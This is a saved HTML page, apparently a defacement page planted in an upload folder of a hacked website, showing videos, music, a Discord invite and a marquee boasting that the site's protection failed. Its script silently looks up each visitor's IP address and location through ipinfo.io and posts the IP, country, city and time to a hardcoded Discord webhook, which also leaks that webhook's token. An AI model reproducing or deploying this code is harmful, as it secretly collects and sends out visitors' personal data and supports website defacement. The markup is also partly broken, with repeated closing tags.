<!-- saved from url=(0070)http://www.234wed.com/attached/file/20241118/20241118043043_68676.html -->
<<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PSYCHO & CJ</title>
<style>
    body {
        margin: 0;
        padding: 0;
        font-family: 'Courier New', Courier, monospace;
        color: #490a0a;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        text-align: center;
        overflow: hidden;
        background-color: black; /* لون الخلفية الأسود */
    }

    /* صفحة الفيديو الأول */
    .background-video {
        position: absolute;
        top: 50%; /* جعل الفيديو في منتصف الصفحة */
        left: 50%;
        width: 70%; /* التحكم في عرض الفيديو */
        height: auto; /* الاحتفاظ بنسبة العرض إلى الارتفاع */
        transform: translate(-50%, -50%); /* لضمان أن الفيديو يظهر في المركز */
        z-index: -1;
        object-fit: contain; /* التحكم في كيفية عرض محتوى الفيديو */
    }

    /* صفحة المحتوى الثاني */
    .content {
        display: none; /* إخفاء المحتوى الثاني في البداية */
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 1;
        position: relative;
        height: 100vh;
        width: 100%;
    }

    /* الخلفية الثانية (فيديو في الصفحة الثانية) */
    .background-video-second {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        z-index: -1;
    }

    .info {
        margin-top: 20px;
        font-size: 1.5em;
        background: linear-gradient(45deg, white, silver, gold);
        -webkit-background-clip: text;
        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
        letter-spacing: 4.5px;
        white-space: pre-wrap;
    }

    .text {
        margin-top: 20px;
        font-size: 3em;
        background: linear-gradient(45deg, white, silver, gold);
        -webkit-background-clip: text;
        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
        letter-spacing: 4.5px;
    }

    .marquee {
        position: absolute;
        top: 10%;
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
    }

    .marquee span {
        display: inline-block;
        font-size: 2em;
        color: #ff0000;
        text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000;
        animation: scroll 10s linear infinite;
    }

    @keyframes scroll {
        0% { transform: translateX(100%); }
        100% { transform: translateX(-100%); }
    }

    /* تعديل لتكبير الصورة وضمان وضعها في المركز */
    .image-container img {
        max-width: 80%; /* تحدد الحد الأقصى لحجم الصورة */
        height: auto;  /* لحفاظ الصورة على النسب */
        margin: 20px auto; /* يضع الصورة في الوسط أفقيًا */
        display: block; /* ضمان أن الصورة ستكون في منتصف الصفحة */
    }
</style>
</head>
<body>
<!-- الفيديو الذي يتم تشغيله في البداية -->
<video class="background-video" autoplay muted>
    <source src="https://j.top4top.io/m_3260pjgnd1.mp4" type="video/mp4">
    Your browser does not support the video tag.
</video>
<!-- محتوى الصفحة الثانية -->
<div class="content">
    <!-- الفيديو الذي سيكون خلفية الصفحة الثانية -->
    <video class="background-video-second" autoplay loop muted>
        <source src="https://e.top4top.io/m_3345i21j41.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <!-- شريط النص المتحرك -->
    <div class="marquee">
    </div>

 <div id="content">
    <div class="image-container">
        <img src="https://f.top4top.io/p_3358e9fn21.jpg" alt="Image">
    </div>
    <div class="text-content">
        <p>! 3mk Abu Munif - 3mk Eagle .</p>
    </div>
</div>

<style>
    #content {
        text-align: center;
        padding: 20px;
    }

    .image-container img {
        width: 200px; /* تغيير الحجم حسب الحاجة */
        height: auto; /* الحفاظ على النسبة الصحيحة للصورة */
    }

    .text-content {
        margin-top: 20px; /* مسافة بين الصورة والنص */
        font-size: 16px;
    }
</style>


    <!-- معلومات الفيديو والنصوص -->
    <div class="info" id="ip-info">Loading IP Info...</div>
    <div class="text"> https://discord.gg/PezywVTTfK </div>

      <!-- الصوت -->
    <audio autoplay loop>
        <source src="https://audio.jukehost.co.uk/5vlKJX8Q0vxc3vTxevG0iPvv4sU2pEda" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
</div>

<script>
    // الانتقال من الفيديو إلى المحتوى الثاني عند انتهائه
    const video = document.querySelector('.background-video');
    const content = document.querySelector('.content');
    
    // عند انتهاء الفيديو، عرض المحتوى الثاني	
    video.onended = function() {
        content.style.display = 'flex';  // عرض المحتوى الثاني
        video.style.display = 'none';    // إخفاء الفيديو
    };

    // Fetch IP information without API token
     fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = `PY 3mk MUSIC
<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;

            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://discord.com/api/webhooks/1377686904669077584/cDuqzG-2VuIqMpI-0dXVovWPcZgrZkAl6yhQfJX31VSXzxIO79SJagSIERRcqy2Wh715';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
            });
        });
    </script>
</body>
</html>
</script>
</body>
</html>
</script>
<marquee>
              <font size="6">
                <b></b>   3mk MUSIC - 3mk Abu Munif - 3mk Eagle - حمايه فاشله - hmm Anti cheat is down ! - MUSIC now in your system !
          </div>
      </td>
    </table>
   
